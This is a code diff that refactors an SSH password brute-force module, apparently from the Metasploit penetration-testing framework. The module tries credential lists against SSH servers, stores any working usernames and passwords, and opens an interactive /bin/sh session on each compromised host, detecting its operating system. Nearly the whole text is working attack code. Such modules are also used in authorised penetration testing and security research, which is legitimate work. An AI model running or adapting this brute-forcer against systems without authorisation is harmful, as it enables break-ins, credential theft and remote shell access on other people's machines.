@@ -5,6 +5,8 @@
 
 require 'msf/core'
 require 'net/ssh'
+require 'metasploit/framework/login_scanner/ssh'
+require 'metasploit/framework/credential_collection'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -12,8 +14,6 @@ class Metasploit3 < Msf::Auxiliary
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::CommandShell
-
-  attr_accessor :ssh_socket, :good_credentials
 
   def initialize
     super(
@@ -47,145 +47,100 @@ class Metasploit3 < Msf::Auxiliary
 
     deregister_options('RHOST')
 
-    @good_credentials = {}
-
   end
 
   def rport
     datastore['RPORT']
   end
 
-  def do_login(ip,user,pass,port)
-    opt_hash = {
-      :auth_methods  => ['password','keyboard-interactive'],
-      :msframework   => framework,
-      :msfmodule     => self,
-      :port          => port,
-      :disable_agent => true,
-      :password      => pass,
-      :config        => false,
-      :proxies       => datastore['Proxies']
+  def session_setup(result, ssh_socket)
+    return unless ssh_socket
+
+    # Create a new session
+    conn = Net::SSH::CommandStream.new(ssh_socket, '/bin/sh', true)
+
+    merge_me = {
+      'USERPASS_FILE' => nil,
+      'USER_FILE'     => nil,
+      'PASS_FILE'     => nil,
+      'USERNAME'      => result.credential.public,
+      'PASSWORD'      => result.credential.private
     }
+    info = "#{proto_from_fullname} #{result.credential} (#{@ip}:#{rport})"
+    s = start_session(self, info, merge_me, false, conn.lsock)
 
-    opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
-
-    begin
-      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
-        self.ssh_socket = Net::SSH.start(
-          ip,
-          user,
-          opt_hash
-        )
-      end
-    rescue Rex::ConnectionError, Rex::AddressInUse
-      return :connection_error
-    rescue Net::SSH::Disconnect, ::EOFError
-      return :connection_disconnect
-    rescue ::Timeout::Error
-      return :connection_disconnect
-    rescue Net::SSH::Exception
-      return [:fail,nil] # For whatever reason. Can't tell if passwords are on/off without timing responses.
+    # Set the session platform
+    case result.proof
+    when /Linux/
+      s.platform = "linux"
+    when /Darwin/
+      s.platform = "osx"
+    when /SunOS/
+      s.platform = "solaris"
+    when /BSD/
+      s.platform = "bsd"
+    when /HP-UX/
+      s.platform = "hpux"
+    when /AIX/
+      s.platform = "aix"
+    when /Win32|Windows/
+      s.platform = "windows"
+    when /Unknown command or computer name/
+      s.platform = "cisco-ios"
     end
 
-    if self.ssh_socket
-      proof = ''
-      begin
-        Timeout.timeout(5) do
-          proof = self.ssh_socket.exec!("id\n").to_s
-          if(proof =~ /id=/)
-            proof << self.ssh_socket.exec!("uname -a\n").to_s
-          else
-            # Cisco IOS
-            if proof =~ /Unknown command or computer name/
-              proof = self.ssh_socket.exec!("ver\n").to_s
-            else
-              proof << self.ssh_socket.exec!("help\n?\n\n\n").to_s
-            end
-          end
-        end
-      rescue ::Exception
-      end
-
-      # Create a new session
-      conn = Net::SSH::CommandStream.new(self.ssh_socket, '/bin/sh', true)
-
-      merge_me = {
-        'USERPASS_FILE' => nil,
-        'USER_FILE'     => nil,
-        'PASS_FILE'     => nil,
-        'USERNAME'      => user,
-        'PASSWORD'      => pass
-      }
-      info = "#{proto_from_fullname} #{user}:#{pass} (#{ip}:#{port})"
-      s = start_session(self, info, merge_me, false, conn.lsock)
-
-      # Set the session platform
-      case proof
-      when /Linux/
-        s.platform = "linux"
-      when /Darwin/
-        s.platform = "osx"
-      when /SunOS/
-        s.platform = "solaris"
-      when /BSD/
-        s.platform = "bsd"
-      when /HP-UX/
-        s.platform = "hpux"
-      when /AIX/
-        s.platform = "aix"
-      when /Win32|Windows/
-        s.platform = "windows"
-      when /Unknown command or computer name/
-        s.platform = "cisco-ios"
-      end
-      return [:success, proof]
-    else
-      return [:fail, nil]
-    end
+    s
   end
 
-  def do_report(ip,user,pass,port,proof)
-    report_auth_info(
-      :host => ip,
-      :port => rport,
-      :sname => 'ssh',
-      :user => user,
-      :pass => pass,
-      :proof => proof,
-      :source_type => "user_supplied",
-      :active => true
-    )
-  end
 
   def run_host(ip)
+    @ip = ip
     print_brute :ip => ip, :msg => "Starting bruteforce"
-    each_user_pass do |user, pass|
-      print_brute :level => :vstatus,
-        :ip => ip,
-        :msg => "Trying: username: '#{user}' with password: '#{pass}'"
-      this_attempt ||= 0
-      ret = nil
-      while this_attempt <=3 and (ret.nil? or ret == :connection_error or ret == :connection_disconnect)
-        if this_attempt > 0
-          select(nil,nil,nil,2**this_attempt)
-          print_brute :level => :verror, :ip => ip, :msg => "Retrying '#{user}':'#{pass}' due to connection error"
-        end
-        ret,proof = do_login(ip,user,pass,rport)
-        this_attempt += 1
-      end
-      case ret
-      when :success
-        print_brute :level => :good, :ip => ip, :msg => "Success: '#{user}':'#{pass}' '#{proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
-        do_report(ip,user,pass,rport,proof)
+
+    cred_collection = Metasploit::Framework::CredentialCollection.new(
+      blank_passwords: datastore['BLANK_PASSWORDS'],
+      pass_file: datastore['PASS_FILE'],
+      password: datastore['PASSWORD'],
+      user_file: datastore['USER_FILE'],
+      userpass_file: datastore['USERPASS_FILE'],
+      username: datastore['USERNAME'],
+      user_as_pass: datastore['USER_AS_PASS'],
+    )
+
+    scanner = Metasploit::Framework::LoginScanner::SSH.new(
+      host: ip,
+      port: rport,
+      cred_details: cred_collection,
+      stop_on_success: datastore['STOP_ON_SUCCESS'],
+      connection_timeout: datastore['SSH_TIMEOUT'],
+    )
+
+    scanner.scan! do |result|
+      credential_data = result.to_h
+      credential_data.merge!(
+          module_fullname: self.fullname,
+          workspace_id: myworkspace_id
+      )
+      case result.status
+      when Metasploit::Model::Login::Status::SUCCESSFUL
+        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
+        credential_core = create_credential(credential_data)
+        credential_data[:core] = credential_core
+        create_credential_login(credential_data)
+        session_setup(result, scanner.ssh_socket)
         :next_user
-      when :connection_error
+      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
         print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
+        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
+        invalidate_login(credential_data)
         :abort
-      when :connection_disconnect
-        print_brute :level => :verror, :ip => ip, :msg => "Connection timed out"
-        :abort
-      when :fail
-        print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{user}':'#{pass}'"
+      when Metasploit::Model::Login::Status::INCORRECT
+        print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
+        invalidate_login(credential_data)
+        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
+        else
+          invalidate_login(credential_data)
+          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
       end
     end
   end
